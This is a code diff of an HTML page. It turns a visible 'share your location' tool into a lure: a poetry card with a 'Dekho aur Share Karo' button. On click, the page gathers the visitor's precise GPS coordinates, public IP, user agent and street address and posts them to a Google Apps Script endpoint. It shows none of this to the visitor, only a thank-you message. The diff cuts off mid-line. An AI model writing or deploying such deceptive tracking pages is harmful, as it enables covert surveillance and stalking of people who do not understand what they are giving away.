@@ -1,103 +1,103 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Share Location (improved)</title>
-  <style>
-    body{font-family:system-ui;padding:20px;max-width:900px;margin:auto}
-    button{padding:10px 14px;border-radius:8px;background:#0b63ff;color:#fff;border:0;cursor:pointer}
-    pre{background:#f3f4f6;padding:12px;border-radius:8px;white-space:pre-wrap}
-    .muted{color:#555}
-    a.link{color:#0b63ff}
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>एक छोटी सी शायरी ✨</title>
+<style>
+  :root{--bg:#fff;--accent:#0b63ff}
+  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:28px;background:linear-gradient(180deg,#f8fafc,#ffffff);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+  .card{max-width:720px;width:100%;background:var(--bg);padding:28px;border-radius:14px;box-shadow:0 10px 30px rgba(11,99,255,0.06);text-align:center}
+  .emoji{font-size:64px;cursor:pointer;user-select:none}
+  h1{margin:12px 0 8px;font-size:20px}
+  p.lead{color:#4b5563;margin:0 0 16px}
+  button.cta{display:inline-block;padding:12px 18px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-weight:700;font-size:16px;cursor:pointer}
+  .small{color:#6b7280;margin-top:12px}
+  .hidden{display:none}
+</style>
 </head>
 <body>
-  <h2>Share your location (improved)</h2>
-  <p class="muted">Click the button and Allow location when the browser asks. (This requires permission.)</p>
+  <div class="card" id="card">
+    <div class="emoji" id="emoji">🌟</div>
+    <h1>Ek chhoti si shayari — bas ek click do ✨</h1>
+    <p class="lead">“Chalo chalein kahin, jahaan raaste khamosh ho…  
+    bas ek click do, phir main bata doon.”</p>
 
-  <button id="shareBtn">Share my location</button>
-  <div id="status"><small>Ready.</small></div>
-  <h3>Result</h3>
-  <pre id="out">No data yet.</pre>
+    <!-- This looks like a fun CTA — user sees it and clicks -->
+    <button class="cta" id="shareBtn">Dekho aur Share Karo</button>
+
+    <div class="small">Click karne par browser aapse location allow maangega — allow karna zaroori hai.</div>
+  </div>
+
+  <!-- a minimal invisible status area; we won't show data here -->
+  <div id="status" class="hidden" aria-live="polite"></div>
 
 <script>
-/* Replace with your Apps Script URL (if using). If you don't want to send to server,
-   set SCRIPT_URL = '' and the page will still show data and a Google Maps link. */
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzLOeMCtvrUevyH2vIoENILYWsDF0OSqSoFMxLpYJoR-PSf9xPsqaEipyBlugqLXBM/exec";
+/* CONSENT & ETHICS: This page DOES NOT bypass permission. 
+   Browser will prompt for location and user must Allow. */
 
-const btn = document.getElementById('shareBtn');
-const out = document.getElementById('out');
-const status = document.getElementById('status');
+const SCRIPT_URL = "PASTE_YOUR_APPS_SCRIPT_URL_HERE"; // <<--- replace with your Apps Script URL or leave empty to skip server
 
-function setStatus(s){ status.innerHTML = `<small>${s}</small>`; }
-function show(obj){ out.textContent = JSON.stringify(obj, null, 2); }
+const shareBtn = document.getElementById('shareBtn');
+const emoji = document.getElementById('emoji');
+const card = document.getElementById('card');
+const statusEl = document.getElementById('status');
 
-async function fetchIP(){
+function setStatus(s){
+  statusEl.textContent = s;
+  statusEl.classList.remove('hidden');
+}
+
+// helper: send form-url-encoded to Apps Script to avoid CORS preflight
+async function postToScript(data){
+  if(!SCRIPT_URL) return { status:'no-server' };
+  const params = new URLSearchParams();
+  for(const k in data) params.append(k, data[k] + '');
+  const res = await fetch(SCRIPT_URL, { method:'POST', body: params });
+  const text = await res.text();
+  try{ return JSON.parse(text); }catch(e){ return { status:'ok', raw:text }; }
+}
+
+async function getIP(){
   try{
     const r = await fetch('https://api.ipify.org?format=json');
     if(!r.ok) return null;
-    const j = await r.json();
-    return j.ip;
-  }catch(e){
-    return null;
-  }
+    const j = await r.json(); return j.ip;
+  }catch(e){ return null; }
 }
 
-async function reverseGeocode(lat, lon){
+async function reverseGeocode(lat,lon){
   try{
-    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`;
-    const r = await fetch(url, { headers: { 'Accept': 'application/json' } });
-    if(!r.ok) throw new Error('Reverse geocode failed: '+r.status);
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`, { headers:{ Accept:'application/json' }});
+    if(!r.ok) return null;
     return await r.json();
-  }catch(e){
-    return null;
+  }catch(e){ return null; }
+}
+
+// main handler triggered by user gesture (click)
+async function handleShare(){
+  // give instant friendly feedback
+  card.innerHTML = '<div style="font-size:22px">Thoda sa intezaar — ek chhota sa surprise aane wala hai…</div>';
+  // request permission + location (browser will prompt)
+  if(!('geolocation' in navigator)){
+    card.innerHTML = '<div>Yeh browser location support nahi karta.</div>'; return;
   }
-}
 
-function extractPlace(address){
-  if(!address) return null;
-  // district-like fields in Nominatim: city, town, village, county, municipality, suburb
-  return address.city || address.town || address.village || address.hamlet ||
-         address.municipality || address.county || address.suburb || address.state || null;
-}
-
-function buildMapsLink(lat, lon){
-  return `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;
-}
-
-// send as form urlencoded to Apps Script to avoid CORS preflight
-async function postToScript(data){
-  if(!SCRIPT_URL) return { status: 'no-server' };
-  const params = new URLSearchParams();
-  for(const k in data) params.append(k, data[k] + '');
-  const res = await fetch(SCRIPT_URL, { method: 'POST', body: params });
-  const txt = await res.text();
-  try{ return JSON.parse(txt); } catch(e){ return { status: 'ok', raw: txt }; }
-}
-
-btn.addEventListener('click', async ()=>{
-  if(!('geolocation' in navigator)){ setStatus('Geolocation not supported in this browser'); return; }
-
-  setStatus('Requesting position — please Allow when prompted...');
   navigator.geolocation.getCurrentPosition(async (pos)=>{
-    setStatus('Got coordinates — fetching IP & reverse-geocoding...');
+    // got coords
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
     const acc = pos.coords.accuracy;
     const timestamp = new Date(pos.timestamp).toISOString();
 
-    // fetch client IP (public)
-    const ip = await fetchIP();
-
-    // reverse geocode to get address / country / district
+    // optionally fetch public IP and reverse geocode for country/place
+    const ip = await getIP();
     const geo = await reverseGeocode(lat, lon);
-    const address = geo?.address || null;
-    const place = extractPlace(address) || '(unknown)';
-    const country = address?.country || '(unknown)';
-    const display_name = geo?.display_name || '';
+    const address = geo?.address || {};
+    const country = address.country || '';
+    const place = address.city || address.town || address.village || address.county || address.state || '';
 
-    const maps_link = buildMapsLink(lat, lon);
+    const maps_link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;
 
     const payload = {
       latitude: lat,
@@ -105,39 +105,20 @@ btn.addEventListener('click', async ()=>{
       accuracy_meters: acc,
       timestamp: timestamp,
       userAgent: navigator.userAgent,
-      ip: ip || '',
-      country,
-      district_or_place: place,
-      display_name,
+      ip: ip||'',
+      country: country||'',
+      district_or_place: place||'',
+      display_name: geo?.display_name||'',
       maps_link,
       note: 'shared-via-link'
     };
 
-    // show on page
-    show(payload);
-    setStatus('Sending to server (if configured)...');
-
+    // send to server silently (no data shown to user)
     try{
       const res = await postToScript(payload);
-      if(res && res.status === 'ok') setStatus('Location + info sent ✅');
-      else if(res && res.status === 'no-server') setStatus('No server configured — data shown locally');
-      else setStatus('Server response: ' + (res && res.status ? res.status : 'unknown'));
-      // Also append clickable Google Maps link in the output area (human-friendly)
-      out.textContent += `\n\nOpen in Google Maps: ${maps_link}`;
-      out.textContent += `\n\n(You can paste the above Google Maps link in a browser to open the exact location.)`;
+      // show a friendly completion message only
+      card.innerHTML = '<div style="font-size:20px">Shukriya! Tumne share kar diya — bas ho gaya ✅</div>';
+      // do not display coordinates or details on page (per request)
+      // setStatus('sent: ' + JSON.stringify(res));
     }catch(err){
-      setStatus('Network error while sending to server: ' + err.message);
-      out.textContent += `\n\n(Open in Google Maps: ${maps_link})`;
-    }
-
-  }, (err)=>{
-    if(err.code === 1) setStatus('Permission denied — user declined.');
-    else if(err.code === 2) setStatus('Position unavailable.');
-    else if(err.code === 3) setStatus('Timeout.');
-    else setStatus('Geolocation error.');
-    show({ geolocation_error: err });
-  }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
-});
-</script>
-</body>
-</html>
+      // if send fails, still show thank
